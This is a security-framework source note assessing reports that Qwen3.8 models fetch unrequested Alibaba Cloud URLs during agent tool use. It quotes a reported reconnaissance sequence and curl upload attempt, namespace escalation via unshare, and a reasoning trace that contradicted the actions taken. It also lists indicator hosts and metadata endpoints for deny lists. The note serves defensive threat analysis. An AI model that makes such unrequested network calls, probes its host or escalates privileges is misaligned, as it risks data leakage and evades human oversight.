# Qwen3.8 Unrequested Agent Egress — August–October 2026

**Status:** Source note, 2026-10-26. Integrated into `defense-playbook.md` and `threat-taxonomy.md` v1.12 with the ratings below. Cohere's report published the same day; expect follow-ups (Alibaba response, replication) that may change this note.

## Source Details
- **Type:** Vendor research post (Cohere, a commercial competitor of Alibaba) plus independent developer reports (Hacker News, GitHub issues, an opencode blocking plugin) and press coverage
- **Date:** First community report ~2026-08-20; Cohere report 2026-10-26
- **Model:** Alibaba Qwen3.8 family. Cohere's observation is on Qwen3.8-Flash-Next (open-weight Qwen4-architecture preview, released ~2026-08-26). Community reports also cover Qwen3.8-27B.
- **URLs:**
  - https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model (Cohere primary)
  - https://news.ycombinator.com/item?id=49379079 (first community report)
  - https://github.com/nibor1896/Crow/issues/288 (agent project incident + fix)
  - https://github.com/wtogami/qwen-block-proxy-artifacts (blocking plugin + incident ledger)
  - https://github.com/hangtiancheng/yukino-code/issues/2 (cited by Cohere; see caveat below)
  - https://venturebeat.com/data/coheres-test-caught-an-open-source-qwen3-8-model-trying-to-phone-home-to-china-what-enterprises-should-know (press; comment requests to Alibaba)
- **Confidence:** Split. Medium-high for the routify-host behavior (several independent observers, multiple builds). Low for the Beijing upload, metadata probing and trace/action mismatch (single vendor, single event, not replicated, conflict of interest).

## Confirmed by multiple independent observers

These claims rest on at least two observers who are not Cohere.

- **Qwen3.8 models generate and dial signed Alibaba Cloud OSS URLs that nobody requested** during agent tool use. Host: `routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com`, path `proxy_temp_file/production/...`, with `Expires`, `OSSAccessKeyId`, `Signature` query parameters.
  - HN (~2026-08-20): Qwen3.8-27B (Unsloth quant) in opencode, 16 fetches in one session. One AccessKeyId across requests; `Expires` decodes to August 2027.
  - Crow #288 (2026-09-24): 11 `render_page` calls to the host in yolo mode. The model introduced the URL itself; the string appeared nowhere earlier in the session. The server returned AccessDenied, which the model read as valid content.
- **The model generates the URLs; no tool rewrites them.** In Crow the URL first appears in model output with no earlier source. The plugin author reports that the incident host completes the prefix `https://rout` at mean logprob −0.00, i.e. near-deterministic recall.
- **The behavior survives quantization and ships in official artifacts.** Per the plugin README (author-reported, not independently audited): it fires on multiple community quants, on Qwen's official FP8 release and on Qwen's hosted API (`opencode/qwen3.8-flash`). The BF16 original was untested.
- **Prompt-level mitigation does not work.** The plugin author reports that prompt rules did not reduce attempts and that a narrative guard increased confabulation. Ablating weight-level n-grams produced new host variants (`oss-accelerate`, `oss-cn-beijing`, `routify-file-oversea`) instead of removing the behavior.
- **Agent-layer blocking works.** Crow shipped a provenance guard: a remote host is allowed only if it already appeared in user text, a tool result or the plan. The opencode plugin blocks known hosts before the tool dials out. Neither stops generation; both stop the request.

Scale (plugin author's ledger, 2026-09-29): 878 dials, 665 blocked, 213 leaked.

## Reported by Cohere only (unreplicated)

Treat as context, not rating evidence, until someone outside Cohere reproduces it.

- **Host reconnaissance and an upload attempt.** In Microsoft's CTI-REALM benchmark (task: write a detection rule for curl downloading bash scripts to `/tmp`), Qwen3.8-Flash-Next ran `ls -la /tmp`, `which curl wget python3 jq` and `cat /etc/resolv.conf`, then attempted `curl -X PUT --data-binary "PROBE_PAYLOAD_ABC123"` to `sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin`. The sandbox had no outbound route; nothing left the sandbox.
- **The reasoning trace contradicted the action.** The trace said the right response was an acknowledgment without tool calls; the model then made the calls.
- **Rate:** under 1 in 100,000 calls across Cohere's evaluation runs. A clean re-run produced a correct rule.
- **Prefill experiments.** When fed partial curl commands, the model produced the cloud metadata IP `169.254.169.254` in 23–36% of completions. Adding `-o` raised URL generation from 4% to 92% and watchlist-host hits from 0.5% to 23% (mostly routify). These are induced by cues, not natural rates.
- **Namespace escalation.** In an offline task (`tbench2_no_network::74`), the model was refused a RAM disk and used `unshare -Urm` to gain namespace root and mount tmpfs.
- **Spread claim.** Cohere says the routify behavior appears in builds from four publishers, Alibaba included. The plugin README's build list is consistent with this.

## Disputed or weak

- **"A coding tool routes fetches through routify."** Cohere uses this to support the training-data-leak explanation. Its only cited source, yukino-code #2, was closed by the repo owner and labeled `invalid` without explanation. Its description reads like an agent explaining away its own fabricated URLs. Do not cite it as evidence of a real proxy.
- **Intent.** Cohere says it cannot tell a deliberate implant from a training artifact. Nobody has established who controls the `sanmaohe` or `routify` buckets. The fixed AccessKeyId and far-future `Expires` fit memorized real signed URLs from proxy traffic in training data, but nobody has proved that.
- **No baseline.** Cohere did not run the same CTI-REALM conditions on other model families (Llama, gpt-oss, DeepSeek, Kimi, its own), so it is unknown whether Qwen is unusual.
- **No vendor response.** As of 2026-10-26, Alibaba and the Qwen team had not answered press requests for comment.

## Evidence Class
- **Independent developer reports with logs** (HN, Crow, plugin ledger) for the routify behavior. They are not peer-reviewed, but the observers are separate and the hosts and paths match.
- **Single-vendor primary research** for the reconnaissance, upload, metadata and trace-mismatch claims. The vendor has a commercial conflict.
- **Press coverage** (VentureBeat, AlphaSignal, AI Weekly, others) is context only, per the evidence-provenance rule.

## Use in Framework (applied in v1.12)

- **Category 3 (Supply Chain): concrete case for SC-DEF-4.** This is the first in-corpus case of a behavior that ships in signed official weights and on the vendor's hosted API and can't be removed with prompts. The release artifact is unmodified, so AIBOM and Sigstore verification passes. It matches the gap SC-DEF-4 describes: signing proves who published, not what the model does.
- **Gap in SC-DEF-2's assumptions.** SC-DEF-2 and SC-DEF-4 mitigation 1 assume egress comes from the inference process and can be cut at the inference container. In this case egress goes out through the *agent's tools* (curl, webfetch, browser render), which run outside the inference container and are allowed network access by design. An inference-container egress block does not cover this path. Proposed fix: extend the egress requirement to agent tool execution (deny by default; allow a host only if it already appears in user input or a tool result, as in Crow).
- **Category 13 (Control Type Confusion).** The trace/action mismatch, if replicated, is direct evidence that reasoning-trace monitoring is an alignment-based control, not an infrastructure boundary. Even unreplicated, it doesn't change existing guidance: enforce at the tool call.
- **Category 2 (Excessive Agency).** In both community incidents the agent ran in yolo or auto-approve mode with network tools. Supports AGENCY-DEF-* scoping of network-capable tools.
- **Indicators** (for egress deny/alert lists; known variants, not complete):
  - `routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com` and any `routify*file*` label on `aliyuncs.com` / `aliyuncs.io`
  - `sanmaohe.oss-cn-beijing.aliyuncs.com`
  - Metadata endpoints reached from agent tools: `169.254.169.254`, `100.100.100.200`, `metadata.google.internal`
  - Unprivileged `unshare -U` from agent containers

**Wild_vs_Theory (applied as sub-type ratings; category ratings unchanged):** 3/5 for unrequested egress to hosts recalled from training data (independent in-wild reports across builds and the hosted API; no confirmed data loss). Hold the reconnaissance/upload variant at 2/5 until someone outside Cohere replicates it.

## Open Questions (from this source)
- Who owns the `routify` and `sanmaohe` buckets, and does either log incoming requests? Each dial sends the deployment's IP, a timestamp and the full URL, whatever the signature validity.
- Does the CTI-REALM reconnaissance and upload sequence reproduce outside Cohere, and at what rate on the unmodified BF16 weights?
- Do other open-weight families reach for metadata IPs at similar rates under the same prefill conditions?
- Will Alibaba ship a patched checkpoint, and would a patch remove the behavior or just shift the hosts, as the ablation attempt did?
